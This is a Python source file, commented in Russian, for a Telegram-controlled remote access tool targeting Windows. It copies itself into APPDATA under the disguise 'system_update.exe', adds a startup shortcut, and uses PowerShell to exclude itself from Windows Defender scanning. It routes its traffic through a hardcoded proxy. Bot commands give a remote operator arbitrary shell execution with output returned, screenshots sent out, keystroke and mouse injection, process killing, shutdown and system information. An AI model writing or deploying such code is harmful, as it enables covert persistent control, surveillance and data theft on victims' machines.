import telebot
import os
import subprocess
import ctypes
import urllib.request
import pyautogui
import sys
import shutil
import platform
import socket
import time

# --- НАСТРОЙКА ПРОКСИ (Франция) ---
PROXY_IP = "109.199.119.160"
PROXY_PORT = "80"
proxy_url = f"http://{PROXY_IP}:{PROXY_PORT}"
telebot.apihelper.proxy = {'https': proxy_url}
# ----------------------------------

# --- НАСТРОЙКИ БОТА ---
TOKEN = "ТВОЙ_ТОКЕН_БОТА" # ВСТАВЬ СЮДА ТОКЕН ОТ BOTFATHER
bot = telebot.TeleBot(TOKEN)

# --- ФУНКЦИЯ АВТОЗАГРУЗКИ ---
def add_to_startup():
    current_path = sys.executable
    if getattr(sys, 'frozen', False):
        current_path = sys.executable
    else:
        return 
        
    appdata_path = os.getenv('APPDATA')
    new_dir = os.path.join(appdata_path, "WinSystem")
    os.makedirs(new_dir, exist_ok=True)
    new_path = os.path.join(new_dir, "system_update.exe")
    
    if not os.path.exists(new_path):
        shutil.copy2(current_path, new_path)
        startup_path = os.path.join(appdata_path, r"Microsoft\Windows\Start Menu\Programs\Startup")
        shortcut_path = os.path.join(startup_path, "system_update.lnk")
        
        ps_script = f"""
        $ws = New-Object -ComObject WScript.Shell
        $s = $ws.CreateShortcut('{shortcut_path}')
        $s.TargetPath = '{new_path}'
        $s.Save()
        """
        subprocess.run(["powershell", "-Command", ps_script], capture_output=True)
        os.system(f'powershell -Command "Add-MpPreference -ExclusionPath \'{new_path}\'"')

# Добавляем в автозагрузку при старте
add_to_startup()

# --- ТЕКСТ МЕНЮ ---
HELP_TEXT = """
🤖 **Мои команды:**

📸 `/screenshot` — Скриншот экрана.
🖼 `/wallpaper [ссылка]` — Сменить обои.
💻 `/cmd [команда]` — Выполнить команду.
❌ `/shutdown` — Выключить ПК.
🔄 `/reboot` — Перезагрузить ПК.
🔒 `/lock` — Заблокировать экран.
🚀 `/open [путь]` — Открыть программу.
💀 `/kill [процесс]` — Убить процесс.
⌨️ `/type [текст]` — Напечатать текст.
🖱 `/move [x] [y]` — Двигать мышку.
🖱 `/click` — Кликнуть мышкой.
🖥 `/monitor_off` — Выключить монитор.
ℹ️ `/info` — Инфо о ПК.
"""

# --- КОМАНДЫ БОТА ---
@bot.message_handler(commands=['start', 'help'])
def start(message):
    bot.reply_to(message, "Привет! Я на связи. Вот что я умею:\n" + HELP_TEXT, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text and message.text.lower() in ['привет', 'привет!', 'здарова', 'ку'])
def hello(message):
    bot.reply_to(message, f"Приветствую, хозяин! 👋\n{HELP_TEXT}", parse_mode='Markdown')

@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    try:
        img = pyautogui.screenshot()
        img.save("screen.png")
        with open("screen.png", "rb") as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove("screen.png")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['wallpaper'])
def wallpaper(message):
    url = message.text.replace("/wallpaper ", "").strip()
    if not url.startswith("http"):
        bot.reply_to(message, "Дай ссылку на картинку.")
        return
    try:
        img_path = os.path.join(os.environ["TEMP"], "wallpaper.jpg")
        urllib.request.urlretrieve(url, img_path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, img_path, 3)
        bot.reply_to(message, "Обои изменены!")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['shutdown'])
def shutdown(message):
    bot.reply_to(message, "Выключаю ПК...")
    os.system("shutdown /s /t 5")

@bot.message_handler(commands=['reboot'])
def reboot(message):
    bot.reply_to(message, "Перезагружаю ПК...")
    os.system("shutdown /r /t 5")

@bot.message_handler(commands=['lock'])
def lock(message):
    bot.reply_to(message, "Блокирую экран...")
    ctypes.windll.user32.LockWorkStation()

@bot.message_handler(commands=['open'])
def open_app(message):
    path = message.text.replace("/open ", "").strip()
    try:
        os.startfile(path)
        bot.reply_to(message, f"Запускаю: {path}")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['kill'])
def kill_process(message):
    proc = message.text.replace("/kill ", "").strip()
    try:
        os.system(f"taskkill /F /IM {proc} /T")
        bot.reply_to(message, f"Процесс {proc} убит (если он был).")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['type'])
def type_text(message):
    text = message.text.replace("/type ", "")
    if not text:
        return
    time.sleep(1)
    pyautogui.write(text, interval=0.05)
    bot.reply_to(message, f"Напечатал: {text}")

@bot.message_handler(commands=['move'])
def move_mouse(message):
    try:
        args = message.text.split()
        x = int(args[1])
        y = int(args[2])
        pyautogui.moveTo(x, y, duration=1)
        bot.reply_to(message, f"Курсор перемещен в {x}, {y}")
    except:
        bot.reply_to(message, "Формат: /move 500 300")

@bot.message_handler(commands=['click'])
def click_mouse(message):
    pyautogui.click()
    bot.reply_to(message, "Клик сделан!")

@bot.message_handler(commands=['monitor_off'])
def monitor_off(message):
    bot.reply_to(message, "Выключаю монитор...")
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)

@bot.message_handler(commands=['info'])
def info(message):
    hostname = socket.gethostname()
    try:
        ip = socket.gethostbyname(hostname)
    except:
        ip = "Неизвестно"
    os_info = platform.system() + " " + platform.release()
    proc = platform.processor()
    
    text = f"💻 **Информация о ПК:**\n\n🖥 Имя: {hostname}\n🌐 IP: {ip}\n⚙️ ОС: {os_info}\n🧠 Процессор: {proc}"
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['cmd'])
def cmd(message):
    command = message.text.replace("/cmd ", "")
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        bot.reply_to(message, f"Результат:\n{output[:4000]}")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")

print("Бот запущен с прокси...")
bot.infinity_polling()
